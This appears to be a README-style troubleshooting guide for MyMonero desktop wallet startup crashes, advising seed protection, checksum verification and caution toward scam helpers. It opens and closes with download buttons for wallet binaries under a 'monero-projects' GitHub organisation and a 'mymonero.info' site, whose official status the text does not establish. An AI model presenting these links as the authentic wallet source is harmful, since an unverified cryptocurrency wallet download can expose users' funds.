<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">MyMonero App Crashes on Start: What to Check</h1>
<p align="center">Separate an application startup crash from wallet recovery, connection, and hosted-login issues.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
A crash on startup does not by itself show that your wallet is lost or that your seed is invalid. Preserve wallet information, note what happens, and check that any installer came from the official MyMonero project release before considering a different wallet route.


For a second walkthrough, see [MyMonero app not opening on mymonero.info](https://mymonero.info/mymonero-app-not-opening). The site also keeps a [MyMonero download page](https://mymonero.info/github/monero-projects) and an overview of [the MyMonero FAQ](https://mymonero.info/faq).

## You'll see this if
- MyMonero opens briefly and closes without reaching the wallet screen.
- A startup message appears, then the app exits.
- The app freezes at launch and stops responding.
- The crash happens after using a newly downloaded installer.
- You are actually trying to open hosted web-wallet login, rather than desktop software.

## Why it happens
A crash is a symptom, not a confirmed explanation. This guidance cannot determine the cause from the word “crash.” The operating system, the downloaded file, or the application process may be involved. Capture the non-sensitive wording and sequence of events, but do not post wallet files, recovery words, private keys, or screenshots containing them.

The product status is important context. MyMonero desktop’s final release is v1.3.3, distributed as a Windows .exe, macOS .dmg, and Linux .zip on monero-projects GitHub. The old app still opens wallets and sends XMR, but is no longer maintained, with no new features or security updates. MyMonero hosted servers and web-wallet login stopped. A hosted login failure is not a desktop crash, and repeated login attempts cannot restore that hosted access. For details see [MyMonero shutdown facts](./mymonero-shutdown-facts.md).

A crash during startup is also different from a wallet that opens but cannot synchronize. For the latter, use [MyMonero not syncing fix](./mymonero-not-syncing.md). If the app never opens, compare the steps in [MyMonero app not opening](./mymonero-app-not-opening.md).

---

## Fix
1. **Stop repeated attempts long enough to observe.** Note whether a window appeared, how long it stayed open, and the exact message. Do not include any secret wallet information. This gives you a concrete symptom rather than a guess about the cause.
2. **Preserve your recovery backup.** Keep the seed in its secure location. Do not uninstall, clear data, or delete files as a first response. Never provide the seed to someone who says they can inspect a crash.
3. **Distinguish desktop from hosted access.** The hosted web-wallet login stopped. If that is what you are opening, the problem is not a desktop startup crash. The final desktop app is a separate product with its own limitations.
4. **Check the installer source.** If the package was obtained through an unfamiliar site, message, or advertisement, do not run it again. The final desktop release is [MyMonero v1.3.3 on GitHub](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3). The project repository is [monero-projects MyMonero desktop wallet](https://github.com/monero-projects/mymonero-desktop-wallet).
5. **Compare the file checksum.** The release page provides the SHA-256 value for comparison. Calculate the downloaded file’s value with `certutil -hashfile <file> SHA256` on Windows, `shasum -a 256 <file>` on macOS, or `sha256sum <file>` on Linux. If values differ, do not use that file. A match checks file integrity, not current maintenance or service availability.
6. **Try a standard restart.** Close the process normally if possible, restart the computer, then make one ordinary launch attempt. Avoid unknown system-cleaning utilities, scripts, and directions to disable security protections.
7. **Decide whether continuing is suitable.** You may continue with MyMonero desktop, understanding it has no new features or security updates, or restore your seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Review the MyMonero migration checklist first.

> [!TIP]
> Write down the operating system, whether the app is v1.3.3, and the moment it closes. Keep the notes free of seed words, private keys, passwords, and wallet-file contents.

---

## If that did not work
If a verified installer still crashes, avoid escalating into risky experiments. The exact cause may require operating-system-specific diagnosis, but do not give remote access to a stranger or install a tool from a chat message. Do not assume that a crash requires you to sweep funds. Sweeping means sending all funds to a new wallet and is a separate action with consequences; see sweep funds to a new wallet.

If your next step is restoration, first identify whether your backup has 13 MyMonero-specific legacy words or 25 standard Monero words. Follow MyMonero 13-word seed restore or 25-word seed migration. Never send words to a helper or type them into an unsolicited recovery page. Offline recovery of a missing seed word is not confirmed here, and the password-reset method is also not confirmed.

During restoration, restore height sets the block height where scanning starts. An earlier height is safer if you are unsure how far back to scan, but takes longer. Read MyMonero restore height explained. If the old app was used to send XMR before crashing, a crash alone does not establish whether a transaction completed; consult MyMonero transaction not showing and avoid making duplicate payments based only on a missing display.

> [!WARNING]
> Never share your seed, private spend key, or private view key with a person offering crash recovery. Nobody legitimate asks for your seed, and a crash report does not require exposing wallet access.

---

## Prevention
Keep a legible seed backup secure and separate from the computer. The seed is the recovery information; the installed application is not a substitute. Do not store words in public cloud notes or send them in screenshots. See back up your MyMonero seed safely.

Download the final desktop package only from the monero-projects GitHub release and compare its SHA-256 against the release page. Avoid lookalike domains, unsolicited update prompts, and “crash repair” downloads. Remember that checksum verification confirms a file matches a published value; it does not make an unmaintained app receive security updates. See MyMonero fake download warning.

Before a major change, make sure you understand the seed format, restore height, and the distinction between restoring and sweeping. For a general trust and maintenance overview, read is MyMonero safe?. Do not rush a wallet migration because of one startup failure.

## FAQ
<details><summary>Does a startup crash erase the wallet?</summary>

A crash alone does not establish that wallet data or funds are gone. Preserve your backup and avoid deleting files without a clear reason.

</details>

<details><summary>Can I use the browser login while the desktop crashes?</summary>

MyMonero hosted servers and web-wallet login stopped, so hosted login is not a replacement route.

</details>

<details><summary>What is the latest desktop release?</summary>

The final MyMonero desktop release is v1.3.3. It is no longer maintained and receives no new features or security updates.

</details>

<details><summary>Should I give a crash-recovery service my seed?</summary>

No. Nobody legitimate asks for your seed. Keep it private and only use it in a wallet restore process you initiated and trust.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [macOS Says MyMonero Cannot Be Opened: Safe Steps](./mymonero-macos-cannot-be-opened.md) | Use the specific right-click Open guidance and avoid weakening security for an untrusted download. |
| [MyMonero Not Syncing](./mymonero-not-syncing.md) | Tell a connection problem from a wallet scan that needs more time. |
| [MyMonero Error 523: What It Means and What to Try](./mymonero-error-523.md) | Understand a server-connection error and check your wallet without risking recovery information. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
